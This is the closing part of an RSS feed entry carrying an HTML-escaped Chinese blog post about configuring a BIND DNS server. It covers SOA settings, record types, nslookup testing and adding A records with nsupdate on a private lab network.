				86400      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; retry &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 day&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
				2419200    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; expire &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4 weeks&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
				604800     &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; minimum &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 week&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
				&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
		IN	NS	dns
dns		IN	A	192.168.100.50
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@		IN SOA	dns.etcd.com. admin.etcd.com. &lt;/code&gt;中，需要配置域名服务器、和管理员邮箱。&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.etcd.com&lt;/code&gt;可转化为邮箱地址&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin@etcd.com&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;常见的记录类型见下表：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;类型&lt;/th&gt;
      &lt;th&gt;说明&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;A&lt;/td&gt;
      &lt;td&gt;地址记录&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;CNAME&lt;/td&gt;
      &lt;td&gt;别名&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;MX&lt;/td&gt;
      &lt;td&gt;邮件交换记录&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;NS&lt;/td&gt;
      &lt;td&gt;域名服务器记录&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;a href=&quot;https://fasionchan.com/network/dns/record-types/&quot;&gt;更多的可参考该资料&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;配置好上述文件后，执行如下命令启动&lt;strong&gt;bind&lt;/strong&gt;服务器。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;named
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如下命令可以查看日志。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /var/log/named.log
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;2-nslookup和nsupdate&quot;&gt;2 nslookup和nsupdate&lt;/h1&gt;
&lt;p&gt;用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nslookup&lt;/code&gt;命令进行一下测试。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;nslookup dns.etcd.com 192.168.100.50
Server:		192.168.100.50
Address:	192.168.100.50#53

Name:	dns.etcd.com
Address: 192.168.100.50
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsupdate&lt;/code&gt;命令可以添加新记录。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;
server 192.168.100.50
zone etcd.com
update add n0.etcd.com 80000 IN A 192.168.100.120
update add n1.etcd.com 80000 IN A 192.168.100.121
update add n2.etcd.com 80000 IN A 192.168.100.122
send
quit
&apos;&lt;/span&gt; | nsupdate
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最后使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nslookup&lt;/code&gt;验证是否添加成功。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;nslookup n0.etcd.com 192.168.100.50
Server:		192.168.100.50
Address:	192.168.100.50#53

Name:	n0.etcd.com
Address: 192.168.100.120


nslookup n1.etcd.com 192.168.100.50
Server:		192.168.100.50
Address:	192.168.100.50#53

Name:	n1.etcd.com
Address: 192.168.100.121


nslookup n2.etcd.com 192.168.100.50
Server:		192.168.100.50
Address:	192.168.100.50#53

Name:	n2.etcd.com
Address: 192.168.100.122
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;bind&lt;/strong&gt;为数据文件开启了&lt;strong&gt;journal&lt;/strong&gt;模式用于保护数据安全，例如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/bind/db.etcd.com&lt;/code&gt;文件的目录下会生成&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;db.etcd.com.jnl&lt;/code&gt;文件，所以随意绕过&lt;strong&gt;bind&lt;/strong&gt;修改数据文件，会导致&lt;strong&gt;bind&lt;/strong&gt;启动失败。虽然删除&lt;strong&gt;jnl&lt;/strong&gt;文件可以恢复启动，但是会造成数据丢失。&lt;/p&gt;
</description>
        <pubDate>Sun, 05 Dec 2021 00:00:00 +0800</pubDate>
        <link>https://cheneyyin.github.io/2021/12/05/dns/</link>
        <guid isPermaLink="true">https://cheneyyin.github.io/2021/12/05/dns/</guid>
        
        <category>DNS</category>
        
        <category>nslookup</category>
        
        <category>nsupdate</category>
        
        <category>bind</category>
        
        
      </item>
    
  </channel>
</rss>
